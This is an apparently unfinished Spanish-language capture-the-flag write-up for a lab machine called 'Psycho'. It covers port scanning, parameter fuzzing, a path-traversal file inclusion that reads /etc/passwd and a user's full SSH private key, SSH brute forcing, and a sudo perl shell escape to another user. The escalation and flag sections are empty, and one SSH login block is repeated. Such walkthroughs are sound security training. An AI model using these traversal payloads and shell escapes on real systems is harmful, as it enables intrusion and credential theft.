# 🎯 Máquina: Psycho
**IP:** 172.17.0.2
**OS:** Linux (Docker)
**Dificultad:** Facil

---
## 1. 🔍 Enumeración
```bash
nmap -p- -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-08 16:50 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: 4You
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 5A:7A:3D:EF:5B:66 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Los servicios no parecen tener vulnerabilidades conocidas, procedemos a la inspección visual del http cargado en apache. Parece haber un nombre que se repite 'Luisillo'.
Debido a falta de pruebas procederemos a realizar un Fuzzing al objetivo:
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
assets       (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
```
Revisamos la dirección en el navegador y nos lleva a un Index con una imagen `background.jpg` sospechoso. Procedemos a una revisión de la imagen, pero parece estar limpia.
En el `html` del sitio principal parece haber un error de código dinamico, lo que nos da a entender que hay un parametro en el backend que está soltando un error `[!] ERROR [!] `.
Probaremos hacer Fuzzing a un posible parametro oculto del .php:
```bash
ffuf -u http://172.17.0.2/index.php?FUZZ=test -w /usr/share/wordlists/dirb/common.txt -fs 2596    #2596 debido a que es el tamaño predeterminado de respuesta
secret   [Status: 200, Size: 2582, Words: 671, Lines: 63, Duration: 0ms]
```
Encontramos un parametro que está esperando una variable, al probarlo directo en la url:
`http://172.17.0.2/index.php?secret=test`
Notamos que no vuelve a saltar el error, dando por hecho que hay un posible LFI, probamos el siguiente link:
`http://172.17.0.2/index.php?secret=../../../../../../etc/passwd`
Entregando en el footer:
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:102::/nonexistent:/usr/sbin/nologin systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash sshd:x:101:65534::/run/sshd:/usr/sbin/nologin luisillo:x:1002:1002::/home/luisillo:/bin/sh 
```
Encontrando los nombres de usuario: `luisillo | vaxei`, por lo que creamos un archivo con ambos usuarios para pasar a la fuerza bruta:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Luego de un rato esperando no tuvimos éxito. Sabemos que tenemos LFI, podemos seguir incursionando por ese lado, por ejemplo buscando las claves de ssh de los usuarios a través de la url vulnerable:
`http://172.17.0.2/index.php?secret=../../../../../../../home/luisillo/.ssh/id_rsa`
No obtuvimos resultados, probamos con el otro usuario:
`http://172.17.0.2/index.php?secret=../../../../../../../home/vaxei/.ssh/id_rsa`
Y obtuvimos la clave:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk
2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3
tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF
ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8
t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa
OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM
2fftTd/dPkOAIFe2p+lqrQlw9tFlPk7dPbmhVsM1CN+DkY5D5XDeUnzICxKHCsc+/f/cmA
UafMqBMHtB1lucsW/Tw2757qp49+XEmic3qBWes1AAAFiGAU0eRgFNHkAAAAB3NzaC1yc2
EAAAGBAL2zeGTmgAhtMAOS2PtkZT6U5gZdLwVbn7IR58yM0CIgUoGVBA+Q5Ni8TQXc0rUA
QMemTLA/o1AlNNg1HzltAOwUFKz/z6q2fi2hoHgTXFWcMn2iZbxyctjC1Wd7Zq5z1EWAhH
EPuGhqBsnuKM4GqPhXSRJR99bddFWGj1/m2V/m0sWK5+r0Kdg425f5qF7VhQAoA3iRrmCS
HWARoYet/hPoXD5mYDL1w8R/KOr4AhYq1yJ8bNztNx9pAdS8FlWPWRXZRIfLd0K5lOkmYf
6d3Ni9Z6PuHsrwtlQrbhdt9uvXHklQqpCsz/bLynu1Qqh/X2EVq+7LLLkKmjma/Dlc6ZOy
hNAOHJOJAEC4pplM6TpbQ5z/AMvJRwJ0TM7lySQrZWheUefANp4BE5AYwzDNn37U3f3T5D
gCBXtqfpaq0JcPbRZT5O3T25oVbDNQjfg5GOQ+Vw3lJ8yAsShwrHPv3/3JgFGnzKgTB7Qd
ZbnLFv08Nu+e6qePflxJonN6gVnrNQAAAAMBAAEAAAGADK57QsTf/priBf3NUJz+YbJ4NX
5e6YJIXjyb3OJK+wUNzvOEdnqZZIh4s7F2n+VY70qFlOtkLQmXtfPIgcEbjyyr0dbgw0j4
4sRhIwspoIrVG0NTKXJojWdqTG/aRkOgXKxsmNb+snLoFPFoEUHZDjpePFcgyjXlaYmZ0G
+bzNv0RNgg4eWZszE13jvb5B8XtDzN4pkGlGvK1+8bInlguLmktQKItXoVhhokGkp4b+fu
7YjDiaS4CyWsxX50wG/ZMgYBwFLRbCDUUdKZxsmCbreHxLKT/sae64E2ahuBSckYZlIzTd
2lp27EOOPvdPlt9gny83JuFHBLChMd4sHq/oU8vGAiGnIvOCWs4wMArbpJQ+EALJk3GYvh
oqWp3Q4N4F1tmwlrbqX2KP2T5yB+rLoBxfJwLELZlzd+O8mfP9Yknaw2vVYpUixUglNWHJ
ZnmN1uAScPAd1ZNvIkPm6IPcThj1hVCkFXgWjQn6NdJj+NGNWcBeUrxBkH0vToD7gfAAAA
wQCvSzmVYSxpX3b9SgH+sHH5YmOXR9GSc8hErWMDT9glzcaeEVB3O2iH/T+JrtUlm4PXiP
kwFc5ZHHZTw2dd0X4VpE02JsfkgwTEyqWRMcZHTK19Pry2zskVmu6F94sOcN8154LeQBNx
gT22Dr/KJA71HkOH7TyeGnlsmBtZoa3sqp3co9inkccnhm1KUeduL4RcSysDqXYbBUtNB6
G1l8HYysm8ISCsoR4KSgxmC5lqCMfBy7z/6nOX7sm5/kP+JMsAAADBAO8TiHrYTl/kGsPM
ITaekvQUJWCp+FCHK07jwzNp4buYAnO3iGvhVQpcS7UboD8/mve207e97ugK4Nqc68SzSu
bDgAnd4FF3NLoXP/qPZPaPS1FRl0pY0jHyB+U6RELgaI34i9AierMc+4M0coUMZvxqay3o
t8jRhz08jiwFifszwNN7taclmNEfkrKBY7nlbxFRd2XLjknZHFUOFzOFWdtXilQa+y6qJ6
lKtE9KWnQgIgZB9Wt+M3lsEVWEdQKN1wAAAMEAyyEsmbLUzkBLMlu6P4+6sUq8f68eP3Ad
bJltoqUjEYwe9KOf07G15W2nwbE/9WeaI1DcSDpZbuOwFBBYlmijeHVAQtJWJgZcpsOyy2
1+JS40QbCBg+3ZcD5NX75S43WvnF+t2tN0S6aWCEqCUPyb4SSQXKi4QBKOMN8eC5XWf/aQ
aNrKPo4BygXUcJCAHRZ77etVNQY9VqdwvI5s0nrTexbHM9Rz6O8T+7qWgsg2DEcTv+dBUo
1w8tlJUw1y+rXTAAAAEnZheGVpQDIzMWRlMDI2NmZmZA==
-----END OPENSSH PRIVATE KEY-----
```
Con lo que podemos entrar directamente al usuario `vaxei` con el comando:
```bash
ssh -i id_rsa vaxei@172.17.0.2
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.87.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
vaxei@b60671bc6147:~$
```
Obteniendo acceso al 
## 2. 🔓 Explotación (Foothold)
Con lo que podemos entrar directamente al usuario `vaxei` con el comando:
```bash
ssh -i id_rsa vaxei@172.17.0.2
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.87.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
vaxei@b60671bc6147:~$
```
Obteniendo acceso al usuario vaxei.
Revisamos los comandos con permiso sudo del usuario:
```bash
sudo -l
Matching Defaults entries for vaxei on b60671bc6147:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User vaxei may run the following commands on b60671bc6147:
    (luisillo) NOPASSWD: /usr/bin/perl
```
Encontramos que vaxei puede correr el binario perl con el usuario de luisillo para la escalada Horizontal. Aprovechamos esta brecha:
```bash
vaxei@b60671bc6147:~$ sudo -u luisillo perl -e 'exec "/bin/sh"'
$
$ whoami
luisillo
$ bash
luisillo@b60671bc6147:/home/vaxei$
```
Logrando ingresar al usuario luisillo, realizamos la misma busqueda de binarios:
```bash
sudo -l
Matching Defaults entries for luisillo on b60671bc6147:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User luisillo may run the following commands on b60671bc6147:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```
Pudiendo ejecutar un archivo `.py` con python3 y permisos root sin contraseña.

## 3. 🚀 Escalada de Privilegios
*(¿Cómo pasamos de ser un usuario normal a ser Administrador o Root?)*


## 4. 🚩 Banderas (Flags)
- **User:** 
- **Root**: 